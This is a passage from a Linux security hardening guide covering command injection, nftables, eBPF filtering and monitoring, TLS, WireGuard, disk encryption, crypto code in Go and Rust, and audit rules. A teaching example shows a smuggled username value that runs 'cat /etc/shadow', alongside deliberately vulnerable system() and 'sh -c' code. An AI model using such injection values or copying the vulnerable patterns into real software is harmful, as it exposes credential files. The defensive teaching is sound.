}

void safe_process(size_t count) {
    if (count > MAX_ALLOWED_COUNT) {
        return;  /* Validate input range */
    }
    
    size_t total_size;
    if (safe_mul_size(count, sizeof(uint64_t), &total_size) != 0) {
        return;  /* Overflow */
    }
    
    size_t alloc_size;
    if (safe_add_size(total_size, 1, &alloc_size) != 0) {
        return;  /* Overflow */
    }
    
    char *arr = malloc(alloc_size);
    if (!arr) return;
    
    /* Safe to use */
}
```

### 12.5 Command Injection

```c
/* VULNERABLE: system() with user input */
char cmd[512];
snprintf(cmd, sizeof(cmd), "ls /home/%s", username);
system(cmd);  /* username = "; cat /etc/shadow; echo " → injection! */
```

**Secure alternatives in C:**

```c
#include 
#include <sys/wait.h>
#include 
#include 

/* SECURE: execve with explicit arguments (no shell) */
int safe_list_directory(const char *username) {
    /* Validate username: only alphanumeric and underscore */
    for (const char *p = username; *p; p++) {
        if (!isalnum((unsigned char)*p) && *p != '_' && *p != '-') {
            return -1;  /* Invalid character */
        }
    }
    
    /* Build path safely */
    char path[256];
    int written = snprintf(path, sizeof(path), "/home/%s", username);
    if (written < 0 || (size_t)written >= sizeof(path)) {
        return -1;
    }
    
    pid_t pid = fork();
    if (pid == 0) {
        /* Child: execute ls without shell */
        char *argv[] = { "/bin/ls", path, NULL };
        char *envp[] = { NULL };  /* Clean environment */
        execve("/bin/ls", argv, envp);
        _exit(127);  /* execve failed */
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        return WEXITSTATUS(status);
    }
    return -1;
}
```

**Command injection in Go (SECURE):**

```go
package main

import (
	"fmt"
	"os/exec"
	"regexp"
	"errors"
)

var safeUsername = regexp.MustCompile(`^[a-zA-Z0-9_-]{1,32}$`)

// SafeListDirectory runs ls without shell interpretation
func SafeListDirectory(username string) ([]byte, error) {
	// Validate input FIRST
	if !safeUsername.MatchString(username) {
		return nil, errors.New("invalid username")
	}

	path := "/home/" + username

	// exec.Command does NOT use a shell - safe from injection
	// Arguments are passed directly to execve
	cmd := exec.Command("/bin/ls", "-la", path)
	cmd.Env = []string{}  // Clean environment
	
	output, err := cmd.Output()
	if err != nil {
		return nil, fmt.Errorf("ls failed: %w", err)
	}
	return output, nil
}

// VULNERABLE (DO NOT USE):
func VulnerableListDirectory(username string) ([]byte, error) {
	// exec.Command with sh -c IS vulnerable to injection!
	cmd := exec.Command("sh", "-c", "ls /home/"+username)
	return cmd.Output()
}
```

**Command injection in Rust (SECURE):**

```rust
use std::process::Command;
use std::path::Path;

fn safe_list_directory(username: &str) -> Result> {
    // Validate: only alphanumeric + underscore
    if !username.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '-') {
        return Err("Invalid username".into());
    }
    if username.len() > 32 || username.is_empty() {
        return Err("Username length invalid".into());
    }
    
    let path = format!("/home/{}", username);
    
    // Verify path exists and is a directory (prevent traversal)
    let p = Path::new(&path);
    if !p.is_dir() {
        return Err("Not a directory".into());
    }
    
    // std::process::Command does NOT use shell - safe from injection
    let output = Command::new("/bin/ls")
        .arg("-la")
        .arg(&path)
        .env_clear()  // Clean environment
        .output()?;
    
    if !output.status.success() {
        return Err(format!("ls failed: {}", output.status).into());
    }
    
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}
```

---

## 13. Linux Networking Security

### 13.1 Netfilter Architecture

Netfilter is the kernel's packet filtering framework. iptables, nftables, and ipset are userspace tools that configure netfilter rules.

```
Netfilter Hooks (IPv4):
=======================

Network Interface (eth0)
    |
    v
[PREROUTING]     ← First hook: raw, conntrack, NAT (DNAT)
    |
    +--→ (routing decision)
    |
    +-→ Destined for local process:
    |       |
    |       v
    |   [INPUT]    ← Filter incoming packets
    |       |
    |       v
    |   Local Process (application)
    |       |
    |       v
    |   [OUTPUT]   ← Filter outgoing packets from local process
    |       |
    |       v
    |   [POSTROUTING]  ← NAT (SNAT), final hook
    |
    +-→ Forwarded (not for local process):
            |
            v
        [FORWARD]  ← Filter forwarded packets
            |
            v
        [POSTROUTING]
```

### 13.2 nftables: Modern Packet Filtering

nftables replaces iptables with a cleaner, more powerful syntax:

```
# /etc/nftables.conf - Production firewall ruleset

#!/usr/sbin/nft -f

flush ruleset

table inet filter {
    # Connection tracking state set (for efficient stateful filtering)
    ct state vmap {
        established : accept,
        related     : accept,
        invalid     : drop,
        new         : continue,
        untracked   : continue
    }

    chain input {
        type filter hook input priority filter; policy drop;

        # Loopback: allow all
        iifname lo accept

        # Accept established/related connections
        ct state { established, related } accept

        # Drop invalid packets early
        ct state invalid drop

        # ICMP: allow types needed for connectivity, rate limit
        ip protocol icmp  icmp type { echo-request, echo-reply,
                                      destination-unreachable,
                                      time-exceeded, parameter-problem } \
                          limit rate 5/second burst 10 packets accept
        ip6 nexthdr icmpv6 icmpv6 type { echo-request, echo-reply,
                                          nd-neighbor-solicit, nd-neighbor-advert,
                                          nd-router-advert, nd-router-solicit } accept

        # SSH: rate limit (brute force protection)
        tcp dport 22 ct state new limit rate 3/minute burst 5 packets accept
        tcp dport 22 ct state new drop  # Drop if rate exceeded

        # HTTPS
        tcp dport { 80, 443 } ct state new accept

        # Custom application ports
        tcp dport 8080 ip saddr { 10.0.0.0/8, 172.16.0.0/12 } ct state new accept

        # Log and drop everything else
        log prefix "[NFT DROP] " flags all
        drop
    }

    chain forward {
        type filter hook forward priority filter; policy drop;
        # Only allow explicitly required forwarding
        ct state { established, related } accept
    }

    chain output {
        type filter hook output priority filter; policy accept;
        # Allow all outgoing (tighten in high-security environments)

        # Block outgoing if from compromised process trying to exfiltrate
        # (detect via UID/GID matching)
        meta skuid 65534 drop  # Block output from 'nobody' user
    }
}

# Rate limiting table
table inet ratelimit {
    chain prerouting {
        type filter hook prerouting priority raw - 1; policy accept;

        # Anti-spoofing: drop packets claiming to be from us
        ip saddr { 10.0.0.0/8, 172.16.0.0/12 } iifname != { lo, eth0 } drop
    }
}
```

```bash
# Apply configuration
nft -f /etc/nftables.conf

# List current ruleset
nft list ruleset

# Atomic rule replacement (safe hot reload)
nft -f new_rules.conf  # All-or-nothing

# Monitor events
nft monitor
```

### 13.3 eBPF for Network Security

eBPF provides high-performance packet filtering without leaving kernel space:

```bash
# TC (Traffic Control) eBPF for per-interface filtering
# Attach eBPF program to network interface
tc qdisc add dev eth0 clsact
tc filter add dev eth0 ingress bpf da obj filter.o sec ingress

# XDP (eXpress Data Path) - filter at NIC driver level
# Fastest possible packet processing
ip link set dev eth0 xdp obj xdp_filter.o sec xdp

# Inspect BPF programs attached to interfaces
bpftool net show
```

**eBPF XDP DDoS mitigation program (C):**

```c
/* xdp_filter.c: Drop all UDP packets from blacklisted IPs */
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

/* BPF map: set of blacklisted source IPs */
struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 100000);
    __type(key, __u32);    /* source IP (network byte order) */
    __type(value, __u64);  /* timestamp of block */
} blacklist SEC(".maps");

SEC("xdp")
int xdp_filter_func(struct xdp_md *ctx)
{
    void *data_end = (void *)(long)ctx->data_end;
    void *data     = (void *)(long)ctx->data;

    /* Parse Ethernet header */
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    /* Only handle IPv4 */
    if (eth->h_proto != bpf_htons(ETH_P_IP))
        return XDP_PASS;

    /* Parse IPv4 header */
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    /* Check blacklist */
    __u32 src_ip = ip->saddr;
    __u64 *blocked = bpf_map_lookup_elem(&blacklist, &src_ip);
    if (blocked) {
        /* Drop: this IP is blacklisted */
        return XDP_DROP;
    }

    /* Rate detection: count packets per source IP */
    /* (simplified - full implementation would use token bucket) */

    return XDP_PASS;
}

char _license[] SEC("license") = "GPL";
```

### 13.4 Cryptographic Network Protocols

**TLS configuration for production:**

```bash
# OpenSSL: test TLS configuration
openssl s_client -connect example.com:443 -tls1_3

# Check certificate chain
openssl s_client -connect example.com:443 -showcerts

# Verify certificate
openssl verify -CAfile /etc/ssl/certs/ca-certificates.crt server.crt

# Generate strong DH parameters (for TLS 1.2)
openssl dhparam -out /etc/ssl/dhparams.pem 4096

# Generate ECDSA key + self-signed cert
openssl ecparam -genkey -name secp384r1 | openssl ec -out server.key
openssl req -new -x509 -sha256 -key server.key \
    -out server.crt -days 365 \
    -subj "/CN=example.com"
```

**nginx TLS hardening:**

```nginx
# /etc/nginx/conf.d/tls.conf

ssl_certificate     /etc/ssl/server.crt;
ssl_certificate_key /etc/ssl/server.key;
ssl_dhparam         /etc/ssl/dhparams.pem;

# Protocol versions
ssl_protocols TLSv1.2 TLSv1.3;

# Strong cipher suites only
ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES256-GCM-SHA384';
ssl_prefer_server_ciphers on;

# TLS 1.3 cipher configuration (cannot be customized - all are strong)

# Session configuration
ssl_session_cache   shared:SSL:10m;
ssl_session_timeout 1d;
ssl_session_tickets off;  # Forward secrecy: disable session tickets

# OCSP stapling
ssl_stapling on;
ssl_stapling_verify on;
resolver 8.8.8.8 8.8.4.4 valid=300s;
resolver_timeout 5s;

# Security headers
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Content-Security-Policy "default-src 'self'" always;
```

### 13.5 WireGuard: Modern VPN Security

WireGuard is a modern VPN protocol built into the Linux kernel (5.6+) using state-of-the-art cryptography:

```
WireGuard cryptographic design:
- Key exchange: Curve25519 (ECDH)
- Symmetric encryption: ChaCha20Poly1305
- Message authentication: Poly1305
- Hashing: BLAKE2s
- Session establishment: Noise_IKpsk2 protocol

No cipher negotiation → no downgrade attacks
No certificates → no PKI complexity
```

```bash
# WireGuard setup
# Server:
wg genkey | tee /etc/wireguard/server.key | wg pubkey > /etc/wireguard/server.pub
chmod 600 /etc/wireguard/server.key

# Client:
wg genkey | tee client.key | wg pubkey > client.pub

# Server config /etc/wireguard/wg0.conf:
cat > /etc/wireguard/wg0.conf << 'EOF'
[Interface]
Address = 10.0.0.1/24
PrivateKey = 
ListenPort = 51820
# Firewall rules applied on bring-up
PostUp = nft add table inet wireguard; nft add chain inet wireguard forward { type filter hook forward priority 0\; }; nft add rule inet wireguard forward iifname wg0 accept
PostDown = nft delete table inet wireguard

[Peer]
PublicKey = 
AllowedIPs = 10.0.0.2/32
# PresharedKey for PQ-resistance:
PresharedKey = 
EOF
chmod 600 /etc/wireguard/wg0.conf

# Start WireGuard
wg-quick up wg0
systemctl enable wg-quick@wg0
```

### 13.6 Network Namespaces for Service Isolation

```bash
# Isolate a service in its own network namespace
# Prevents the service from making unexpected network connections

ip netns add service_ns

# Create veth pair
ip link add veth-host type veth peer name veth-svc
ip link set veth-svc netns service_ns

# Configure host side
ip addr add 192.168.200.1/30 dev veth-host
ip link set veth-host up

# Configure service namespace
ip netns exec service_ns ip addr add 192.168.200.2/30 dev veth-svc
ip netns exec service_ns ip link set lo up
ip netns exec service_ns ip link set veth-svc up
ip netns exec service_ns ip route add default via 192.168.200.1

# Run service in isolated namespace
ip netns exec service_ns sudo -u serviceuser /usr/bin/myservice
```

---

## 14. Cryptography in Linux

### 14.1 Linux Crypto API

The kernel has a comprehensive cryptography API used by dm-crypt, TLS, IPsec, WireGuard, and others:

```bash
# View supported algorithms
cat /proc/crypto

# Test crypto performance
cryptsetup benchmark

# cryptsetup output example:
# Tests are approximate using 128-bit key in CBC mode.
# Algorithm |       Key |      Encryption |      Decryption
#    aes-cbc        128b      1821.0 MiB/s      6042.4 MiB/s
#    aes-xts        256b      2456.7 MiB/s      2487.8 MiB/s
# serpent-cbc        128b       143.6 MiB/s       611.0 MiB/s
#  twofish-cbc        128b       278.8 MiB/s       364.8 MiB/s
#    aes-cbc        256b      1552.2 MiB/s      5084.3 MiB/s
```

### 14.2 Full Disk Encryption with LUKS

```bash
# Create LUKS2 container with Argon2 key derivation
cryptsetup luksFormat \
    --type luks2 \
    --cipher aes-xts-plain64 \
    --key-size 512 \
    --hash sha256 \
    --pbkdf argon2id \
    --pbkdf-memory 1048576 \  # 1GB RAM for KDF (strong against GPU cracking)
    --pbkdf-parallel 4 \
    --iter-time 3000 \         # 3 seconds minimum
    /dev/sda2

# Open encrypted partition
cryptsetup open /dev/sda2 cryptroot

# Add FIDO2 hardware key for unlock
cryptsetup token add --token-type fido2 /dev/sda2

# Add TPM2 for auto-unlock (with PCR policy)
systemd-cryptenroll --tpm2-device=auto --tpm2-pcrs=0+7 /dev/sda2
# PCR 0: firmware
# PCR 7: Secure Boot state
# If either changes, auto-unlock fails (tamper detection)

# View LUKS2 header
cryptsetup luksDump /dev/sda2
```

### 14.3 dm-crypt at Scale

```bash
# Verify encryption is actually in use
dmsetup table --showkeys /dev/mapper/cryptroot

# Check cipher in use
cryptsetup status /dev/mapper/cryptroot
# /dev/mapper/cryptroot is active and is in use.
# type:    LUKS2
# cipher:  aes-xts-plain64
# keysize: 512 bits
# key location: dm-crypt
# device:  /dev/sda2
# ...
```

### 14.4 Transparent Encryption with dm-integrity

dm-integrity provides data integrity verification at the block layer, detecting silent data corruption:

```bash
# Create integrity device
integritysetup format /dev/sdb
integritysetup open /dev/sdb integritydev --integrity sha256

# Combined: dm-crypt + dm-integrity (authenticated encryption)
cryptsetup luksFormat \
    --type luks2 \
    --integrity hmac-sha256 \
    --cipher aes-gcm-random \
    /dev/sdb
```

### 14.5 Cryptography in Go: Secure Patterns

```go
package crypto_secure

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"io"

	"golang.org/x/crypto/argon2"
	"golang.org/x/crypto/chacha20poly1305"
	"golang.org/x/crypto/hkdf"
)

// ==================== Authenticated Encryption (AES-GCM) ====================

const (
	keySize   = 32  // AES-256
	nonceSize = 12  // GCM nonce
	tagSize   = 16  // GCM authentication tag
)

// Encrypt encrypts plaintext with AES-256-GCM.
// Returns ciphertext = nonce || tag || encrypted_data
func Encrypt(key, plaintext, additionalData []byte) ([]byte, error) {
	if len(key) != keySize {
		return nil, fmt.Errorf("key must be exactly %d bytes", keySize)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("create cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("create GCM: %w", err)
	}

	// Generate random nonce - NEVER reuse a nonce with the same key
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("generate nonce: %w", err)
	}

	// Seal appends authentication tag to ciphertext
	ciphertext := gcm.Seal(nonce, nonce, plaintext, additionalData)
	return ciphertext, nil
}

// Decrypt decrypts and authenticates ciphertext produced by Encrypt.
func Decrypt(key, ciphertext, additionalData []byte) ([]byte, error) {
	if len(key) != keySize {
		return nil, fmt.Errorf("key must be exactly %d bytes", keySize)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("create cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("create GCM: %w", err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize+tagSize {
		return nil, errors.New("ciphertext too short")
	}

	nonce := ciphertext[:nonceSize]
	ciphertext = ciphertext[nonceSize:]

	// Open decrypts and authenticates. Returns error if auth fails.
	plaintext, err := gcm.Open(nil, nonce, ciphertext, additionalData)
	if err != nil {
		return nil, errors.New("decryption failed: authentication error")
		// Don't include err details to prevent oracle attacks
	}
	return plaintext, nil
}

// ==================== Password Hashing (Argon2id) ====================

// HashPassword hashes a password with Argon2id.
// Returns the encoded hash string (includes algorithm, params, salt).
func HashPassword(password []byte) (string, error) {
	// Generate random salt
	salt := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, salt); err != nil {
		return "", fmt.Errorf("generate salt: %w", err)
	}

	// Argon2id parameters (OWASP recommendations for 2024):
	// time=3, memory=64MB, parallelism=4
	// For high-security (auth server): time=4, memory=128MB
	time    := uint32(3)
	memory  := uint32(64 * 1024) // 64 MB
	threads := uint8(4)
	keyLen  := uint32(32)

	hash := argon2.IDKey(password, salt, time, memory, threads, keyLen)

	// Encode: version$time$memory$threads$salt$hash
	encoded := fmt.Sprintf("$argon2id$v=%d$m=%d,t=%d,p=%d$%s$%s",
		argon2.Version, memory, time, threads,
		hex.EncodeToString(salt),
		hex.EncodeToString(hash))

	return encoded, nil
}

// ==================== Key Derivation (HKDF) ====================

// DeriveKey derives a key of specified length from input key material.
func DeriveKey(inputKeyMaterial []byte, salt []byte, info string, keyLen int) ([]byte, error) {
	if len(inputKeyMaterial) < 32 {
		return nil, errors.New("input key material too short")
	}

	// HKDF using SHA-256
	reader := hkdf.New(sha256.New, inputKeyMaterial, salt, []byte(info))
	key := make([]byte, keyLen)
	if _, err := io.ReadFull(reader, key); err != nil {
		return nil, fmt.Errorf("derive key: %w", err)
	}
	return key, nil
}

// ==================== ECDH Key Exchange ====================

// ECDHKeyPair generates an ECDH key pair using X25519.
func ECDHKeyPair() (*ecdh.PrivateKey, error) {
	return ecdh.X25519().GenerateKey(rand.Reader)
}

// ECDHSharedSecret computes the shared secret from local private key and remote public key.
func ECDHSharedSecret(local *ecdh.PrivateKey, remote *ecdh.PublicKey) ([]byte, error) {
	return local.ECDH(remote)
}

// ==================== ChaCha20-Poly1305 (for high-performance) ====================

// EncryptChaCha encrypts with ChaCha20-Poly1305 (faster on non-AES-NI hardware).
func EncryptChaCha(key, plaintext, additionalData []byte) ([]byte, error) {
	aead, err := chacha20poly1305.New(key)
	if err != nil {
		return nil, fmt.Errorf("create AEAD: %w", err)
	}

	nonce := make([]byte, aead.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("generate nonce: %w", err)
	}

	return aead.Seal(nonce, nonce, plaintext, additionalData), nil
}
```

### 14.6 Cryptography in Rust: Secure Patterns

```rust
use ring::{
    aead::{self, Aad, BoundKey, Nonce, NonceSequence, OpeningKey, SealingKey, UnboundKey, AES_256_GCM, CHACHA20_POLY1305},
    agreement::{self, EphemeralPrivateKey, PublicKey, X25519},
    pbkdf2,
    rand::{self, SecureRandom},
    digest,
    error::Unspecified,
};
use std::num::NonZeroU32;

// ==================== Authenticated Encryption with ring ====================

struct CounterNonce(u64);

impl NonceSequence for CounterNonce {
    fn advance(&mut self) -> Result {
        let mut nonce_bytes = [0u8; 12];
        nonce_bytes[4..].copy_from_slice(&self.0.to_be_bytes());
        self.0 = self.0.checked_add(1).ok_or(Unspecified)?;
        Ok(Nonce::assume_unique_for_key(nonce_bytes))
    }
}

pub struct AesGcmEncryptor {
    key: SealingKey,
}

impl AesGcmEncryptor {
    pub fn new(key_bytes: &[u8; 32]) -> Result {
        let unbound = UnboundKey::new(&AES_256_GCM, key_bytes)?;
        let key = SealingKey::new(unbound, CounterNonce(0));
        Ok(AesGcmEncryptor { key })
    }

    /// Encrypts plaintext in-place, appending authentication tag.
    /// Returns the authenticated ciphertext (plaintext + tag).
    pub fn encrypt(&mut self, plaintext: Vec, aad: &[u8]) -> Result<Vec, Unspecified> {
        let mut in_out = plaintext;
        // Make room for authentication tag
        in_out.extend_from_slice(&[0u8; 16]);

        self.key.seal_in_place_append_tag(
            Aad::from(aad),
            &mut in_out,
        )?;
        Ok(in_out)
    }
}

// ==================== ECDH Key Exchange with X25519 ====================

pub struct X25519KeyPair {
    private_key: EphemeralPrivateKey,
    public_key: PublicKey,
}

impl X25519KeyPair {
    pub fn generate() -> Result {
        let rng = rand::SystemRandom::new();
        let private_key = EphemeralPrivateKey::generate(&X25519, &rng)?;
        let public_key = private_key.compute_public_key()?;
        Ok(X25519KeyPair { private_key, public_key })
    }

    pub fn public_key_bytes(&self) -> &[u8] {
        self.public_key.as_ref()
    }

    /// Compute shared secret from local private key and remote public key.
    /// Returns HKDF-extracted key material.
    pub fn shared_secret(self, peer_public_bytes: &[u8]) -> Result<Vec, Unspecified> {
        let peer_public = agreement::UnparsedPublicKey::new(&X25519, peer_public_bytes);

        let shared_secret = agreement::agree_ephemeral(
            self.private_key,
            &peer_public,
            |secret| Ok(secret.to_vec()),
        )??;

        Ok(shared_secret)
    }
}

// ==================== Password Hashing with PBKDF2 ====================

pub struct PasswordHasher {
    iterations: NonZeroU32,
}

impl PasswordHasher {
    pub fn new(iterations: u32) -> Result {
        let iterations = NonZeroU32::new(iterations).ok_or("iterations must be > 0")?;
        Ok(PasswordHasher { iterations })
    }

    pub fn hash_password(&self, password: &[u8]) -> Result<(Vec, Vec), Unspecified> {
        let rng = rand::SystemRandom::new();
        let mut salt = vec![0u8; 32];
        rng.fill(&mut salt)?;

        let mut hash = vec![0u8; 32];
        pbkdf2::derive(
            pbkdf2::PBKDF2_HMAC_SHA256,
            self.iterations,
            &salt,
            password,
            &mut hash,
        );

        Ok((hash, salt))
    }

    pub fn verify_password(&self, password: &[u8], hash: &[u8], salt: &[u8]) -> bool {
        pbkdf2::verify(
            pbkdf2::PBKDF2_HMAC_SHA256,
            self.iterations,
            salt,
            password,
            hash,
        ).is_ok()
    }
}

// Note: In production, prefer Argon2 over PBKDF2
// Use the 'argon2' crate for Argon2id
```

---

## 15. eBPF: Power, Observability, and Attack Surface

### 15.1 eBPF Architecture

eBPF (extended Berkeley Packet Filter) allows running sandboxed programs in the Linux kernel. It is revolutionary for observability, networking, and security enforcement.

```
eBPF Architecture:
==================

User Space                    Kernel Space
==========                    ============

eBPF bytecode                 eBPF Verifier
(compiled from C/Go/Rust)     - DAG analysis (no loops*)
        |                     - Register tracking
        v                     - Memory bounds checking
    bpf() syscall             - Stack depth checking
        |                           |
        v                           v
    BPF Map (                   Verified BPF
     shared memory              program loaded
     between user and
     kernel)                    Attached to:
        |                       - kprobes/kretprobes
        |                       - tracepoints
        |                       - XDP/TC hooks
        |                       - LSM hooks
        |                       - Perf events
        |                       - Cgroup hooks
        v
    User reads                  Program executes
    from BPF Map                in kernel context
    (metrics, events,           (safe, bounded)
     security alerts)
```

### 15.2 eBPF for Security Monitoring

```c
/* Detect privilege escalation: monitor setuid/setgid calls */
/* bpf_prog_setuid.c */
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <linux/types.h>
#include <linux/sched.h>

/* Output ring buffer for security events */
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 24);  /* 16MB ring buffer */
} events SEC(".maps");

struct setuid_event {
    __u64 timestamp;
    __u32 pid;
    __u32 tgid;
    __u32 uid_before;
    __u32 uid_after;
    char  comm[16];
};

/* Attach to setuid syscall entry */
SEC("tracepoint/syscalls/sys_enter_setuid")
int trace_setuid(struct trace_event_raw_sys_enter *ctx)
{
    struct setuid_event *event;
    
    event = bpf_ringbuf_reserve(&events, sizeof(*event), 0);
    if (!event) return 0;
    
    event->timestamp  = bpf_ktime_get_ns();
    event->pid        = bpf_get_current_pid_tgid() >> 32;
    event->tgid       = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    event->uid_before = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    event->uid_after  = (__u32)ctx->args[0];  /* new UID */
    bpf_get_current_comm(&event->comm, sizeof(event->comm));
    
    bpf_ringbuf_submit(event, 0);
    return 0;
}

/* Detect execve of suspicious paths */
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 24);
} exec_events SEC(".maps");

struct exec_event {
    __u64 timestamp;
    __u32 pid;
    __u32 uid;
    char  filename[256];
    char  comm[16];
};

SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct trace_event_raw_sys_enter *ctx)
{
    struct exec_event *event;
    const char *filename = (const char *)ctx->args[0];
    
    event = bpf_ringbuf_reserve(&exec_events, sizeof(*event), 0);
    if (!event) return 0;
    
    event->timestamp = bpf_ktime_get_ns();
    event->pid       = bpf_get_current_pid_tgid() >> 32;
    event->uid       = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    bpf_get_current_comm(&event->comm, sizeof(event->comm));
    bpf_probe_read_user_str(event->filename, sizeof(event->filename), filename);
    
    bpf_ringbuf_submit(event, 0);
    return 0;
}

char _license[] SEC("license") = "GPL";
```

### 15.3 eBPF LSM Programs

eBPF LSM (since 5.7) allows attaching eBPF programs to LSM hooks for policy enforcement:

```c
/* bpf_lsm_file.c: Deny file access to specific paths */
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <linux/bpf.h>

/* Deny write to /etc/shadow */
SEC("lsm/inode_permission")
int BPF_PROG(restrict_shadow_write, struct inode *inode, int mask)
{
    /* We need to check the path - simplified version */
    /* Full implementation requires walking the dentry tree */
    
    /* If attempting to write (mask & MAY_WRITE) */
    if (mask & 0x2) {
        /* Check if this is /etc/shadow (by inode number for simplicity)
           In production: compare full path */
        /* Return -EACCES to deny */
        return -EACCES;
    }
    return 0;  /* Allow */
}

/* Log all socket connections */
SEC("lsm/socket_connect")
int BPF_PROG(log_socket_connect, struct socket *sock, struct sockaddr *address, int addrlen)
{
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    char comm[16];
    bpf_get_current_comm(comm, sizeof(comm));
    
    bpf_printk("socket_connect: pid=%u comm=%s\n", pid, comm);
    return 0;  /* Allow but log */
}

char _license[] SEC("license") = "GPL";
```

### 15.4 eBPF Security Considerations

eBPF is powerful but introduces its own attack surface:

**eBPF verifier bugs**: The verifier must guarantee program safety. Historical bugs in the verifier have allowed privilege escalation:
- **CVE-2021-3490**: Incorrect bounds tracking for bitwise operations
- **CVE-2022-23222**: Bounds check bypass via 32-bit pointer arithmetic
- **CVE-2023-2163**: Incorrect pruning allows OOB read/write

**Mitigations:**

```bash
# Restrict unprivileged eBPF
sysctl -w kernel.unprivileged_bpf_disabled=1

# From sysctl.d for persistence:
echo "kernel.unprivileged_bpf_disabled=1" > /etc/sysctl.d/99-bpf.conf

# Restrict BPF JIT (JIT spray attacks)
sysctl -w net.core.bpf_jit_harden=2
# 0: No hardening (default, performance)
# 1: Randomize JIT blinding (partial)
# 2: Full hardening (constant blinding, disable JIT for unprivileged)

# Disable BPF JIT entirely (for high-security, high-cost)
sysctl -w net.core.bpf_jit_enable=0
```

---

## 16. Audit Framework and Intrusion Detection

### 16.1 Linux Audit Framework

The Linux audit framework provides system call-level auditing. It's the kernel-level foundation for security event logging.

```
Audit Architecture:
===================

Kernel:
  System call happens
    → audit_filter_syscall() checks rules
    → if matched: generates audit record
    → record goes to audit netlink socket

User Space:
  auditd: reads from netlink, writes to log
  audisp: dispatcher to plugins (syslog, SIEM, etc.)
  auditctl: configures rules
```

```bash
# Start audit daemon
systemctl enable --now auditd

# Basic audit configuration
auditctl -e 1       # Enable auditing
auditctl -b 8192    # Increase backlog buffer
auditctl -f 1       # Set failure mode (1=printk, 2=panic)

# Monitor file access
auditctl -w /etc/shadow -p rwa -k shadow_access
# -w: path to watch
# -p: permissions to monitor (r=read, w=write, x=execute, a=attribute change)
# -k: key name for searching logs

# Monitor system calls
auditctl -a always,exit -F arch=b64 -S execve -k exec_monitoring
auditctl -a always,exit -F arch=b64 -S ptrace -k ptrace_monitoring
auditctl -a always,exit -F arch=b64 -S mount -k mount_monitoring

# Monitor privileged operations by non-root
auditctl -a always,exit -F arch=b64 -S setuid -F uid!=0 -k setuid_nonroot

# Monitor network connections
auditctl -a always,exit -F arch=b64 -S connect -k outbound_connections

# Persist rules
cp /etc/audit/rules.d/audit.rules /etc/audit/rules.d/10-security.rules
# Edit the rules file, then:
augenrules --load

# Search audit logs
ausearch -k shadow_access
ausearch -m execve -ts today
ausearch -m avc    # SELinux AVC denials

# Generate reports
aureport --summary
aureport --login --summary -i
aureport --failed --summary
```

**Production audit ruleset (`/etc/audit/rules.d/99-stig.rules`):**

```bash
# Delete all existing rules
-D

# Buffer size
-b 8192

# Failure mode: 1=printk, 2=panic (use 2 for high-security)
-f 1

# ============================================================
# Audit access to sensitive files
# ============================================================
-w /etc/shadow          -p rwa -k identity
-w /etc/passwd          -p rwa -k identity
-w /etc/group           -p rwa -k identity
-w /etc/gshadow         -p rwa -k identity
-w /etc/sudoers         -p rwa -k sudoers
-w /etc/sudoers.d/      -p rwa -k sudoers
-w /etc/ssh/            -p rwa -k sshd_config
-w /etc/pam.d/          -p rwa -k pam_config
-w /etc/audit/          -p rwa -k audit_config
-w /etc/sysctl.conf     -p rwa -k sysctl
-w /etc/sysctl.d/       -p rwa -k sysctl

# ============================================================
# Monitor kernel module operations
# ============================================================
-w /sbin/insmod         -p x -k modules
-w /sbin/rmmod          -p x -k modules
-w /sbin/modprobe       -p x -k modules
-a always,exit -F arch=b64 -S init_module,finit_module -k modules
-a always,exit -F arch=b64 -S delete_module -k modules

# ============================================================
# Monitor privilege escalation
# ============================================================
-a always,exit -F arch=b64 -S setuid -F a0=0 -F exe=/usr/bin/su -k priv_esc
-a always,exit -F arch=b64 -S setuid -F a0=0 -F exe=/usr/bin/sudo -k priv_esc
-a always,exit -F arch=b64 -S setresuid -F a0=0 -k priv_esc
-a always,exit -F arch=b64 -S ptrace -k ptrace

# ============================================================
# Monitor process execution
# ============================================================
-a always,exit -F arch=b64 -S execve -k exec
-a always,exit -F arch=b32 -S execve -k exec

# ============================================================
# Monitor network connections
